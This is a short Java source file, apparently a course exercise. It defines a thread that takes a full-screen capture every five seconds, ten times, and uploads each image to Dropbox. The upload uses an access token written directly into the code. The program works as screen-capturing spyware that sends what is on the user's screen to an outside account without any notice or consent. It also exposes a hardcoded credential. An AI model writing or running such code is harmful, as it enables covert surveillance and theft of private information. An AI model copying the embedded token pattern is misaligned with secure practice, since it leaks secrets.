package intensive;


import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;


public class MyThread extends Thread {
    @Override
    public void run()
    {
        String ACCESS_TOKEN = "sl.Ab9qTNZZwqoZ5pCQRMjeuwhr1gyMfBiQHEpH1s0rrGiNt129uw7cM6ljpPAO71YO7SAKW7uC8gfRBBcC6ZAtge5fGzIuQPH-8mv4Z3HiHjV74YzgebFVZ67Zbk7IGHjrLx9aq_g";
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);

        int x = 0;
        while (x < 10) // Можно написать while (true), но я не хочу (я боюсь)...
        {
            x++;
            BufferedImage image = null;
            try {
                sleep(5000);

                image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));

                SimpleDateFormat formatter = new SimpleDateFormat("yyyyMMdd_HHmmss");
                Date now = new Date();
                String name = "/" + formatter.format(now) + ".png";

                ByteArrayOutputStream os = new ByteArrayOutputStream();
                ImageIO.write(image, "png", os);
                InputStream in = new ByteArrayInputStream(os.toByteArray());

                client.files().uploadBuilder(name)
                        .uploadAndFinish(in);
            } catch (Exception e) {
                e.printStackTrace();
            }

        }
    }
}
